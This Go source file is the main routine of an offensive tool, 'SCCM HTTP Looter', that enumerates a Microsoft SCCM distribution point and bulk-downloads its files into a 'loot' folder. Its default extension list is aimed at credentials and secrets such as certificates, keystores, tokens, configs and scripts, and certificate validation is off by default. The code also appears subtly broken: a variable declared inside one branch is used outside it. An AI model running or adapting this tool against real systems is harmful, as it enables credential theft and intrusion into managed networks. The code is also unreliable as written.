package main

import (
	"flag"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/k0kubun/go-ansi"
	"github.com/schollz/progressbar/v3"
)

var customHTTPClient http.Client
var urlBase string

func main() {
	protocol := flag.String("protocol", "http", "The protocol (http or https)")
	server := flag.String("server", "127.0.0.1", "The IP address or hostname of the SCCM DP")
	port := flag.String("port", "80", "The port of the HTTP(S) server on the SCCM DP")
	outputDir := flag.String("output", "./loot", "The base output directory for files related to this DP")
	fileAllowList := flag.String("allow", "ps1,vbs,txt,cmd,bat,pfx,pem,cer,certs,expect,sql,xml,ps1xml,config,ini,ksh,sh,rsh,py,keystore,reg,yml,yaml,token,script,sqlite,plist,au3,cfg", "A comma-separated list of file extensions (no dot) to allow. Use 'all' to allow all file types")
	numThreads := flag.Int("threads", 1, "Number of threads (goroutines) for concurrent downloading")
	validate := flag.Bool("validate", false, "Validate HTTPS certificates")
	datalibPath := flag.String("datalib", "", "Path to a DataLib directory listing download (for cases where the listing cannot be retrieved with this tool)")
	signaturesPath := flag.String("signatures", "", "Path to a directory containing .tar signatures (for cases where you want to reprocess a server without having to re-download signatures)")
	downloadNoExt := flag.Bool("downloadnoext", false, "Download files without a file extension")
	userAgent := flag.String("useragent", "sccm-http-looter", "User agent to use for all requests")
	httpTimeout := flag.String("timeout", "10s", "HTTP timeout value, use a number + 'ms', 's', 'm', or 'h' for values")
	randomize := flag.Bool("randomize", false, "randomize the order of requests for signatures and files")
	verbose := flag.Bool("verbose", false, "print debug/error statements")
	signatureMethod := flag.Bool("use-signature-method", false, "get filenames from signature files")
	urlsPath := flag.String("urlsPath", "", "Path to a file containing URLs (for cases where you want to reprocess downloads without re-scraping the URLs)")

	flag.Parse()

	slog.Info("SCCM HTTP Looter by Bad Sector Labs (@badsectorlabs)")

	allowExtensions := strings.Split(*fileAllowList, ",")

	customHTTPClient = createCustomHTTPClient(*userAgent, !*validate, *httpTimeout)

	urlBase = fmt.Sprintf("%s://%s:%s", *protocol, *server, *port)

	if *verbose {
		slog.SetLogLoggerLevel(slog.LevelDebug)
	}

	// Get the DataLib HTML content from the server or from disk
	var datalibBody string
	if *datalibPath == "" {
		var err error
		datalibBody, err = getDatalibListing(*server, *outputDir)
		if err != nil {
			if strings.Contains(err.Error(), "401") {
				writeStringArrayToFile(filepath.Join(*outputDir, "401"), []string{})
			} else if strings.Contains(err.Error(), "404") {
				writeStringArrayToFile(filepath.Join(*outputDir, "404"), []string{})
			} else if strings.Contains(err.Error(), "error reading response body") {
				writeStringArrayToFile(filepath.Join(*outputDir, "body error"), []string{})
			}
			return
		}
	} else {
		content, err := os.ReadFile(*datalibPath)
		if err != nil {
			slog.Error(fmt.Sprintf("Unable to read file: %s", *datalibPath))
			return
		}
		datalibBody = string(content)
	}
	fileNames := extractFileNames(datalibBody)
	// Use the filenames from Datalib to pull down signature files, parse them, and finally download files
	if *signatureMethod {
		// Get all the signature files from the server, or a gather a list from disk
		var filePaths []string
		if *signaturesPath == "" {
			getSignatures(*outputDir, fileNames, *numThreads, *randomize)
			filePaths = walkDir(filepath.Join(*outputDir, "signatures"))
			if filePaths == nil {
				slog.Error("No signature files found!")
				return
			}
		} else {
			filePaths = walkDir(*signaturesPath)
		}

		if *randomize {
			randomizeStrings(filePaths)
		}

		bar := progressbar.NewOptions(len(filePaths),
			progressbar.OptionSetWriter(ansi.NewAnsiStdout()),
			progressbar.OptionEnableColorCodes(true),
			progressbar.OptionShowBytes(false),
			progressbar.OptionShowCount(),
			progressbar.OptionShowElapsedTimeOnFinish(),
			progressbar.OptionSetWidth(30),
			progressbar.OptionSetDescription("[cyan][2/2][reset] Getting files..."),
			progressbar.OptionSetTheme(progressbar.Theme{
				Saucer:        "[green]=[reset]",
				SaucerHead:    "[green]>[reset]",
				SaucerPadding: " ",
				BarStart:      "[",
				BarEnd:        "]",
			}))

		totalFiles := 0
		// Get all the file names from every signature, then download the INI and finally the binary
		for _, filePath := range filePaths {
			bar.Add(1)

			fileNames, err := getFileNamesFromSignatureFile(filePath)
			if err != nil {
				slog.Error("Error:", err)
				continue
			}
			// Save filenames to disk
			writeStringArrayToFile(filepath.Join(*outputDir, *server+"_files.txt"), fileNames)
			totalFiles += len(fileNames)
			// Download all the wanted files
			downloadFiles(*outputDir, filePath, fileNames, allowExtensions, *downloadNoExt, *numThreads, *randomize)
		}
		bar.Finish()
	} else { // URL method
		// Just use the datalib to loop over directories and look for files directly
		slog.Info(fmt.Sprintf("Found %d Directories in the Datalib", len(fileNames)))
		if *urlsPath == "" {
			allFileURLs := getAllFileURLsFromDirNames(fileNames, *numThreads, *randomize)
			writeStringArrayToFile(filepath.Join(*outputDir, *server+"_urls.txt"), allFileURLs)
		} else {
			slog.Info(fmt.Sprintf("Using provided URLs file: %s", *urlsPath))
			content, err := os.ReadFile(*urlsPath)
			if err != nil {
				slog.Error(fmt.Sprintf("Unable to read file: %s", *urlsPath))
				return
			}
			allFileURLs = strings.Split(string(content), "\n")
		}
		bar := progressbar.NewOptions(len(allFileURLs),
			progressbar.OptionSetWriter(ansi.NewAnsiStdout()),
			progressbar.OptionEnableColorCodes(true),
			progressbar.OptionShowBytes(false),
			progressbar.OptionShowCount(),
			progressbar.OptionShowElapsedTimeOnFinish(),
			progressbar.OptionSetWidth(30),
			progressbar.OptionSetDescription("[cyan][2/2][reset] Getting files..."),
			progressbar.OptionSetTheme(progressbar.Theme{
				Saucer:        "[green]=[reset]",
				SaucerHead:    "[green]>[reset]",
				SaucerPadding: " ",
				BarStart:      "[",
				BarEnd:        "]",
			}))
		var wg sync.WaitGroup
		wg.Add(len(allFileURLs))

		// Create a channel to limit the number of concurrent downloads
		semaphore := make(chan struct{}, *numThreads)

		for _, fileURL := range allFileURLs {
			bar.Add(1)
			wanted, outputDir := fileWanted(allowExtensions, *downloadNoExt, extractFileName(fileURL), *outputDir)
			if wanted {
				// Add an empty struct to the semaphore channel to "take up" one slot/thread
				semaphore <- struct{}{}
				go downloadFileFromURLAsHashName(fileURL, outputDir, &wg, semaphore)
			}
		}
		bar.Finish()
	}

	slog.Info("SCCM Looting complete!")

}
